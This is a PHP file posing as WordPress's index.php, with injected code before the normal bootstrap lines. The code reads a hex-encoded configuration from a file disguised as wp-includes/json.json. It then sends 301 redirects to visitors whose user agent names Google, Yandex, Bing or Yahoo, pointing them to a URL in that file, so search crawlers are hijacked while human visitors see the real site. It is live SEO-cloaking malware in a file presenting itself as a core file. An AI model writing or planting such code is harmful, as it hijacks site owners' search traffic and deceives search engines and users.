<?php
function babalinkds(){
$file = file_get_contents("wp-includes/json.json");
$json = json_decode(hex2bin($file));
$agent = $_SERVER["HTTP_USER_AGENT"];
$sec = $agent;
switch(true){
case (strpos($sec,"google")): $part = 1; break;
case (strpos($sec,"yandex")): $part = 1; break;
case (strpos($sec,"bing")): $part = 1; break;
case (strpos($sec,"yahoo")): $part = 1; break;
default : $part = 0;
}
if($part ==1){

if($json->yonlen_kod){

$say_s = $_SERVER["REQUEST_URI"];
$saydim = strlen($say_s);
$git_url =   $json->yonlen_kod.$_SERVER["REQUEST_URI"];
if($saydim > 2){
header("HTTP/1.1 301 Moved Permanently");
header("Location: {$git_url}");
exit;
}else{
header( "HTTP/1.1 301 Moved Permanently");
header( "Location: {$json->yonlen_kod}/");
exit;
}
}
}
}
babalinkds();
define( "WP_USE_THEMES", true );
require( dirname( __FILE__ ) . "/wp-blog-header.php" );
